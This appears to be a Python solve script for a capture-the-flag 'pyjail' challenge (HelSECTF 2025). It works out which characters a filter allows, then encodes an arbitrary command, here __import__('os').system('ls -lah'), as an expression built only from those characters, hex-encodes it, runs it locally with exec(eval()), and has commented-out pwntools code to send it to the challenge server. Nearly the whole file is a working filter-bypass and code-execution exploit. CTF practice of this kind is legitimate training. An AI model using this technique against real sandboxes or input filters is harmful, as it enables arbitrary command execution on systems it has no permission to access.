import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning) 

banned = """\nUC5#$;sg^o.`xI\\\x0b3wLMEn_GuA6jJl/yW'kd>+@\x0ct|N VmBr0K-9bOHSYZP?8v*41qRzh&eXFT\r7\tDiQ=p2"""
banned2 = """oZOx.':Ri*U9N\nAT3HjI0z>Bn4F`5;L}SkldPG$KYw?maE{7g+Mrv2s\\b_u&tVC-e=D\x0b@J^Q|h 1W\r#8p6!\x0cq][X\t/y"""

# Find out what ascii characters is NOT in banned

print("These are not banned ascii characters: ", end="")
for i in range(32,127):
    if chr(i) not in banned:
        print(chr(i), end=" ")
print()

# These are not banned ascii characters: ! " % ( ) , : < [ ] a c f { } 

expression_true = '(""<"c")'
expression_false = '(""<"")'

def generate_numer(n):
    # Base cases
    if n == 0:
        return expression_false
    if n == 1:
        return expression_true

    # Even: use left shift (multiplication by 2)
    if n % 2 == 0:
        return f"({generate_numer(n // 2)})<<{expression_true}"
    # Odd numbers greater than 1: use negative helper
    # We use the identity: n = ~((negative((n+1)//2))<<(""<"c"))
    return f"~(({generate_negative((n+1)//2)})<<{expression_true})"

def generate_negative(n):
    """
    Generate an expression for -n using only allowed symbols.
    We use: -n = ~(n - 1)  (since ~x = -x - 1, so ~(<expr for n-1>) equals -n)
    """
    if n == 0:
        return expression_false
    return f"~({generate_numer(n - 1)})"


numbers = {n: generate_numer(n) for n in range(129)}

script = """
__import__('os').system('ls -lah')
"""
# script = "'print(1)'"
script_numbers = ",".join([f"({numbers[ord(c)]})" for c in script])
script_characters = "".join(["%c" for c in script])
script_string = f"\"{script_characters}\"%({script_numbers})"

script_hex = script_string.encode().hex().encode()
print(len(script_hex))

_in = bytes.fromhex(script_hex[0:4096].decode().strip()).decode()
print(exec(eval(_in)))


# from pwn import *
# context.log_level = 'warn'


# io = remote("helsectf2025-42694257c6fdb3976dd6-banished-ree.chals.io", 443, ssl=True)
# io.recvuntil(b">> ")
# io.sendline(script_hex)
# io.interactive()